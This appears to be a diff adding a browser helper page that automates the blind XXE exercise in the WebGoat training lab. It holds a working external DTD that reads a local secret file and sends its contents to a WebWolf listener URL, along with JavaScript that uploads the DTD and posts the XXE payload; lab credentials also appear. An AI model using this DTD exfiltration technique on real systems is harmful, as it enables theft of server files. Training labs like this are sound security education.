@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XXE Blind - Remote WebWolf Upload</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 50px auto;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #667eea;
+            border-bottom: 3px solid #764ba2;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #764ba2;
+            margin-top: 30px;
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-left: 4px solid #2196F3;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .success {
+            background: #e8f5e9;
+            border-left-color: #4CAF50;
+        }
+        .warning {
+            background: #fff3e0;
+            border-left-color: #ff9800;
+        }
+        .error {
+            background: #ffebee;
+            border-left-color: #f44336;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+        .code {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 13px;
+        }
+        #output {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            min-height: 100px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 12px;
+        }
+        .step {
+            background: #f9f9f9;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #667eea;
+            border-radius: 5px;
+        }
+        .step-number {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: calc(100% - 24px);
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        input[type="file"] {
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 XXE Blind - Remote WebWolf Method</h1>
+        
+        <div class="info error">
+            <strong>⚠️ Network Issue Detected:</strong><br>
+            Local Python server cannot be accessed by remote WebGoat server.<br>
+            Solution: Upload DTD to WebWolf on the same network as WebGoat.
+        </div>
+
+        <div class="info">
+            <strong>Network Architecture:</strong><br>
+            • WebGoat: <code>192.168.254.112:8001</code> (remote)<br>
+            • WebWolf: <code>192.168.254.112:8002</code> (should be on same remote machine)<br>
+            • Your Browser: <code>127.0.0.1</code> (local)<br><br>
+            The DTD must be hosted where WebGoat can reach it!
+        </div>
+
+        <h2>Method 1: Manual Upload via WebWolf Interface</h2>
+        
+        <div class="step">
+            <span class="step-number">1</span>
+            <strong>Open Remote WebWolf</strong>
+            <button onclick="openRemoteWebWolf()">Open WebWolf</button>
+            <div class="info" style="margin-top: 10px;">
+                URL: <code>http://192.168.254.112:8002/WebWolf</code><br>
+                Login: <code>nooniman / nooniman</code>
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">2</span>
+            <strong>Upload attack_remote.dtd</strong>
+            <div class="info">
+                Look for "File Upload" or "Files" section in WebWolf.<br>
+                Upload: <code>c:\webgoat-scripts-1\attack_remote.dtd</code><br>
+                After upload, it should be at: <code>http://192.168.254.112:8002/files/nooniman/attack_remote.dtd</code>
+            </div>
+        </div>
+
+        <h2>Method 2: Upload via File Input (Browser API)</h2>
+        
+        <div class="step">
+            <span class="step-number">A</span>
+            <strong>Select DTD File to Upload</strong><br>
+            <input type="file" id="fileInput" accept=".dtd">
+            <button onclick="uploadDTDFile()">📤 Upload to WebWolf</button>
+            <div class="info warning" style="margin-top: 10px;">
+                Select <code>attack_remote.dtd</code> from <code>c:\webgoat-scripts-1\</code>
+            </div>
+        </div>
+
+        <h2>Method 3: Create DTD Directly in Browser</h2>
+        
+        <div class="step">
+            <span class="step-number">B</span>
+            <strong>Upload DTD Content via Fetch</strong>
+            <button onclick="createAndUploadDTD()">🚀 Create & Upload DTD</button>
+            <div class="info" style="margin-top: 10px;">
+                This will create the DTD content and upload it to WebWolf
+            </div>
+        </div>
+
+        <h2>Execute Blind XXE Attack</h2>
+
+        <div class="step">
+            <span class="step-number">3</span>
+            <strong>Test DTD Accessibility</strong>
+            <button onclick="testRemoteDTD()">Test DTD</button>
+        </div>
+
+        <div class="step">
+            <span class="step-number">4</span>
+            <strong>Send Blind XXE Attack</strong>
+            <button onclick="sendBlindXXE()">🚀 Send Attack</button>
+        </div>
+
+        <div class="step">
+            <span class="step-number">5</span>
+            <strong>Check WebWolf Incoming Requests</strong>
+            <button onclick="openRemoteWebWolf()">Open WebWolf</button>
+            <div class="info warning" style="margin-top: 10px;">
+                Click "Incoming requests" tab. Look for:<br>
+                <code>/WebWolf/landing?secret=YOUR_SECRET</code>
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">6</span>
+            <strong>Submit Secret</strong>
+            <input type="text" id="secret" placeholder="Enter secret from WebWolf">
+            <button onclick="submitSecret()">✅ Submit</button>
+        </div>
+
+        <h2>Output</h2>
+        <div id="output">Ready to attack...\n</div>
+
+        <h2>DTD Content (for remote WebWolf)</h2>
+        <div class="code">&lt;!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://localhost:8002/WebWolf/landing?secret=%file;'&gt;"&gt;
+%eval;
+%exfil;</div>
+
+        <div class="info warning">
+            <strong>Note:</strong> Using <code>localhost:8002</code> because WebWolf is on the same machine as WebGoat.<br>
+            WebGoat will make the request to its localhost, which is the remote machine.
+        </div>
+    </div>
+
+    <script>
+        const output = document.getElementById('output');
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️';
+            output.textContent += `[${timestamp}] ${prefix} ${message}\n`;
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function openRemoteWebWolf() {
+            log('Opening remote WebWolf...', 'info');
+            window.open('http://192.168.254.112:8002/WebWolf', '_blank');
+        }
+
+        async function uploadDTDFile() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+            
+            if (!file) {
+                log('Please select a file first!', 'error');
+                return;
+            }
+
+            log('Uploading file to WebWolf...', 'info');
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            try {
+                const response = await fetch('http://192.168.254.112:8002/WebWolf/fileupload', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.text();
+                log('Upload response: ' + response.status, response.ok ? 'success' : 'error');
+                log(result, 'info');
+
+                if (response.ok) {
+                    log('DTD should be at: http://192.168.254.112:8002/files/nooniman/' + file.name, 'success');
+                }
+            } catch (error) {
+                log('Upload failed: ' + error.message, 'error');
+                log('Try manual upload via WebWolf web interface', 'info');
+            }
+        }
+
+        async function createAndUploadDTD() {
+            log('Creating DTD content...', 'info');
+
+            const dtdContent = `<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://localhost:8002/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;`;
+
+            log('DTD content created', 'success');
+
+            // Create a blob and upload
+            const blob = new Blob([dtdContent], { type: 'application/xml' });
+            const formData = new FormData();
+            formData.append('file', blob, 'attack.dtd');
+
+            log('Uploading to WebWolf...', 'info');
+
+            try {
+                const response = await fetch('http://192.168.254.112:8002/WebWolf/fileupload', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.text();
+                log('Upload response: ' + response.status, response.ok ? 'success' : 'error');
+                log(result, 'info');
+
+                if (response.ok) {
+                    log('DTD uploaded to: http://192.168.254.112:8002/files/nooniman/attack.dtd', 'success');
+                } else {
+                    log('Upload may have failed. Try manual upload instead.', 'warning');
+                }
+            } catch (error) {
+                log('Upload failed: ' + error.message, 'error');
+                log('CORS or network error. Use WebWolf web interface for manual upload.', 'warning');
+            }
+        }
+
+        async function testRemoteDTD() {
+            log('Testing remote DTD accessibility...', 'info');
+            
+            try {
+                const response = await fetch('http://192.168.254.112:8002/files/nooniman/attack.dtd');
+                
+                if (response.ok) {
+                    const content = await response.text();
+                    log('DTD is accessible!', 'success');
+                    log('DTD content:\n' + content, 'info');
+                } else {
+                    log('DTD not found (status: ' + response.status + ')', 'error');
+                    log('Make sure to upload it via WebWolf first', 'warning');
+                }
+            } catch (error) {
+                log('Failed to access DTD: ' + error.message, 'error');
+            }
+        }
+
+        async function sendBlindXXE() {
+            log('Sending Blind XXE attack...', 'info');
+
+            const payload = `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://192.168.254.112:8002/files/nooniman/attack.dtd">
+  %remote;
+]>
+<comment><text>Blind XXE Attack</text></comment>`;
+
+            try {
+                const response = await fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {'Content-Type': 'application/xml'},
+                    body: payload
+                });
+
+                const result = await response.text();
+                log('Response: ' + result, 'success');
+                log('Now check WebWolf incoming requests!', 'success');
+            } catch (error) {
+                log('Attack failed: ' + error.message, 'error');
+            }
+        }
+
+        async function submitSecret() {
+            const secret = document.getElementById('secret').value.trim();
+            
+            if (!secret) {
+                log('Please enter a secret!', 'error');
+                return;
+            }
+
+            log('Submitting secret: ' + secret, 'info');
+
+            try {
+                const response = await fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({comment: secret})
+                });
+
+                const result = await response.text();
+                log('Response: ' + result, result.includes('success') || result.includes('Correct') ? 'success' : 'error');
+            } catch (error) {
+                log('Submission failed: ' + error.message, 'error');
+            }
+        }
+
+        log('Tool loaded', 'success');
+        log('First: Upload DTD to WebWolf on remote machine', 'info');
+    </script>
+</body>
+</html>
